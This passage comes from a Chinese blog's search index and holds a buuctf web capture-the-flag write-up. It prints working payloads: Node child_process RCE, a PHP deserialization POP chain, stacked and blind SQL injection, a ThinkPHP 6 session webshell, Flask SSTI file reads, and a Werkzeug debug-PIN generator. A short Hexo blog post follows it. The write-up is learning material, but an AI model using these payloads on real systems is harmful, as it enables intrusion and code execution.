&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag&#39;);var _tmp2&quot;&#125;&#125; 路径通过报错得到： 然后访问/flag 得到flag。 [WEB]Easyphp题目分析扫描目录发现： 存在备份文件，下载代码审计： admin 进入update页面 可得到flag 查看是否存在注入： 存在预处理，因此无法注入 查询的sql语句为： 1select id,password from user where username&#x3D;? 查询admin用户的密码，密码和数据库相等则登陆成功。 通过控制执行的语句即可绕过登录admin： 12select id,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;? &#x2F;&#x2F;&quot;202cb962ac59075b964b07152d234b70&quot;为123的MD5，密码输入123即可 接下来就是利用反序列化漏洞，构造pop链去执行sql语句： 1UpdateHelper类在结束时 会echo 调用魔术方法 1触发User的__toString()方法 1调用Info的__call()方法 1__call 方法调用了login 这里可以： 12$this-&gt;CtrlCase 为dbCtrl类login参数为：$this-&gt;age传进来的 pop 链： 1UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125; 寻找反序列化入口： update页面会调用update方法： 可见$_POST[&#39;age&#39;]与$_POST[&#39;nickname&#39;]可控，传入Info类实例化，然后反序列化，再经过safe函数处理。 可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸： 可见是一个字符增加的字符串逃逸。 漏洞利用Info()类正常序列化： 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;testage&quot;;s:8:&quot;nickname&quot;;s:8:&quot;testname&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下： 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:265:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为： 1unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 序列化一下并用safe函数处理： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1590:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见可以逃逸出来，因此payload： 1age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 登录页面 用户名admin 密码任意： [WEB]Blacklist题目分析首先查询，发现和强网杯的很像 因此尝试堆叠注入，过滤字符： 因此无法改名，也无法用预处理语句。 通过查资料 发现可以利用handler语句 可见flag在FlagHere表 Getflag构造语句查一下第一行数据： 123通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 11&#39;;handler &#96;FlagHere&#96; open;handler &#96;FlagHere&#96; read first;handler &#96;FlagHere&#96; close; 直接查到了flag。 [WEB]Ezsqli题目分析sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数： 发现and、or等函数都过滤了： 发现^没有过滤，采用^测试注入点： 12id&#x3D;1^0%23id&#x3D;1^1%23 返回错误 返回正确。 发现存在注入。 接下来就构造注入语句，因为过滤了or，所以无法使用information_schema 绕过函数： 12345sys.schema_auto_increment_columnssys.schema_table_statistics_with_buffersys.x$schema_table_statistics_with_buffersys.x$schema_flattened_keysjoin无列名注入 构造查表语句： 判断逻辑：返回Nu1L说明payload为1对，语句成立 返回Error Occured When Fetch Result payload为0，语句不成立 12查表名：id&#x3D;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;)^1 可见表名：f1ag_1s_h3r3_hhhhh 下面用无列名注入，利用到了ascii位偏移： 两个字符串比较时利用首字符的ascii码 核心payload：(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1) //子查询之间也可以直接通过&gt;、&lt;、=来进行判断。 测试字段： 123select 1select 1,2select 1,2,3 构造payload： 1id&#x3D;1^((select 1,&#39;f&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1 可见Nu1L页面的上一位就是我们要查询的值. Getflag 成功查询到flag。 [WEB]EasyThinking题目分析题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息： 猜测搜索处存在利用点。扫描目录发现存在www.zip，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本： 参考：https://paper.seebug.org/1114/ 参考：https://xz.aliyun.com/t/8409 TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径\\runtime\\session，文件名为32位就可以，构造后缀为.php的32位字符串，访问sess_+文件名 漏洞利用从注册的时候开始修改： 注册后search 页面 提交key，先写入&lt;?php phpinfo();?&gt; 然后访问看下：http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php 写入一句话，蚁剑连接发现执行不了命令，看下phpinfo： 发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass: [WEB]FlaskApp题目分析根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面： 查看源码发现提示PIN 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码： 可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。 漏洞利用采用if条件语句防止被过滤： 123456789&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9 可以得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;s_e_c_r_e_t_k_e_y&#x27;bootstrap = Bootstrap(app)class NameForm(FlaskForm): text = StringField(&#x27;BASE64加密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)class NameForm1(FlaskForm): text = StringField(&#x27;BASE64解密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1def hint(): txt = &quot;失败乃成功之母！！&quot; return render_template(&quot;hint.html&quot;,txt = txt)def encode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64encode(text.encode()) tmp = &quot;结果 :&#123;0&#125;&quot;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&#x27;encode&#x27;)) else : text = &quot;&quot; form = NameForm(text) return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;)def decode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for(&#x27;decode&#x27;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&#x27;decode&#x27;)) else : text = &quot;&quot; form = NameForm1(text) return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)def not_found(name): return render_template(&quot;404.html&quot;,name = name)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 1[&#39;SECRET_KEY&#39;] &#x3D; &#39;s_e_c_r_e_t_k_e_y&#39; 重点在waf： 123456def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1 可见过滤了命令执行常用函数，不能采用命令执行的方式。 继续读一下必要信息： 1234567891011121314username #读取&#x2F;etc&#x2F;passwd&#x2F;&#x2F;本题：flaskwebmodname #flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))为Flaskgetattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径&#x2F;&#x2F;本题通过报错得到路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.pyuuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式&#x2F;&#x2F;获取方式：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#x2F;&#x2F;本题：02:42:ac:10:af:49 转化为十进制(python print(0x0242ac10af49)) 2485377871689get_machine_id()&#x2F;&#x2F;读取&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值&#x2F;&#x2F;windows读取注册表：SOFTWARE\\\\Microsoft\\\\Cryptography&#x2F;&#x2F;docker下：&#x2F;proc&#x2F;self&#x2F;cgroup&#x2F;&#x2F;本题：0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*-coding:utf-8# From https://xz.aliyun.com/t/2553import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485377871689&#x27;,#str(uuid.getnode()), /sys/class/net/ens0/address &#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 信息修改完整后运行得到 pin码：410-898-797 读文件： 123import osos.listdir(&#x27;/&#x27;)os.popen(&#x27;cat /this_is_the_flag.txt&#x27;).readlines() 有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload： 1&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125; 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1], &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/categories/Writeup/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"}]},{"title":"This is the first blog","slug":"The_first_blog","date":"2021-04-18T12:21:57.275Z","updated":"2021-05-02T14:53:37.577Z","comments":true,"path":"2021/04/18/The_first_blog/","link":"","permalink":"https://v1sun.github.io/2021/04/18/The_first_blog/","excerpt":"","text":"This is the first blog说明学生时代马上结束了，服务器也到期了 又回到了刚接触网络安全的时候所采用的的低成本方式：Github+Hexo 博客用于记录自己的一些学习笔记，方便梳理自己的知识体系，同时也通过写博客来督促自己完成学习任务，减少一些DDL 去年一年准备各种考试，技术方面落下了不少，正在恶补的同时希望能够继续提升自己 That’s all……… 主题基于对Material Design 风格的热爱，采用Fluid主题 主题 GitHub: https://github.com/fluid-dev/hexo-theme-fluid 主题文档：https://hexo.fluid-dev.com/docs/start/ 安装方便，Hexo 5.0.0 版本以上，通过 npm 直接安装： 1npm install --save hexo-theme-fluid 博客目录下创建_config.fluid.yml文件，copy github的内容，根据自己的需要修改配置。","categories":[],"tags":[]}],"categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/categories/Writeup/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"}]}